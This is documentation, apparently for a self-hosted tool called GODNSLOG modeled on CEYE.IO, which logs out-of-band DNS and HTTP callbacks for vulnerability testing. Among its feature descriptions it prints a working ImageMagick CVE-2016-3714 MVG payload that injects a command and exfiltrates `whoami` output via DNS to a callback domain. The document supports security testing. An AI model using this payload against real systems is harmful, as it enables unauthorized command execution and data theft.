# 简介

GODNS功能特性:
- 多用户
- DNSLOG
- HTTPLOG 记录
- DNS Rebinding
- 记录结果推送

CEYE.IO platform, which monitoring DNS queries and HTTP requests through its own DNS server and HTTP server, it can also create custom files as online payloads. It can help security researchers collect information when testing vulnerabilities (e.g. SSRF/XXE/RFI/RCE).

每一个`GODNSLOG`用户会分配一个唯一的域名，域名前缀为`shortId`是godnslog平台的唯一用户标识。 `安全设置`页面中如下图

![](basic-security.png)

`bkkpdcy7lo84.godnslog.com`是给当前用户分配的唯一域名，`bkkpdcy7lo84`为`shortId`区分用户, 三级域名`*.bkkpdcy7lo84.godnslog.com`下所有DNS请求记录均会被记录下来，`*`字段由用户自定义，建议跟扫描ID对应起来，用来关联扫描结果。 


GODNSLOG在设计中大量参考了[CEYE.IO](http://ceye.io)，包括本文档的内容也是，在此向`CEYE.IO`平台致敬。

## DNS LOG功能

DNS queries resolve in a number of different ways. In this case, CEYE.IO platform provide a dnsserver to resolve domain - ceye.io. Its nameserver address is set to own server IP, therefore all DNS queries about domain - ceye.io will be sent to own DNS server eventually.

For example, use nslookup to query dnsquery.test.b182oj.ceye.io in terminal, and you will found this querying in record page: 

![](https://images.seebug.org/ceye/dns-query-1.png)

The Remote column recording client ip address, Query Name column recoding domain name client queried, UPDate column show the last time queried, and Count column show how many times querying for this domain. 

![](https://images.seebug.org/ceye/dns-query-2.png)

Also, there is all records detail about b182oj.ceye.io or *.b182oj.ceye.io DNS queries in DNS queries page. In this page, You can clearly or export these records.

CVE-2016–3714 - the RCE vulnerability in ImageMagick, influencing many applications used this componment, but in this case, may be there is no feedback when testing this vulnerability, because of ImageMagick couldn't return any information usually. With CEYE.IO platform, you can send Payload with a specail mark to collect the command execution result returned.

e.g. (cve-2016-3714.mvg)

  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/"|ping `whoami`.rce.imagemagick.b182oj.ceye.io")'
  pop graphic-context

whoami will be executed in linux system if this host is vulnerable, and padding its value with .rce.imagemagick.b182oj.ceye.io, ping command will be executed, you will found the result in DNS queries page if succeed: 

![](https://images.seebug.org/ceye/dns-query-3.png)


DNSLOG 记录内容包含以下字段：
- domain
- IP
- 记录时间


## HTTP LOG功能

GODNSLOG 的`/log/`接口提供了HTTPLOG的功能，访问`http://*.{shortId}.godnslog.com/log/?p=httptest`的记录都会被记录下来

记录内容包含以下字段:

- IP
- Method
- URL
- User-Agent
- Content-Type 类型
- Data body数据
- 记录时间

![](https://images.seebug.org/ceye/http-request-1.png)


## 致谢

[CEYE.IO](http://ceye.io)
[dnslog](https://github.com/fanjq99/dnslog)
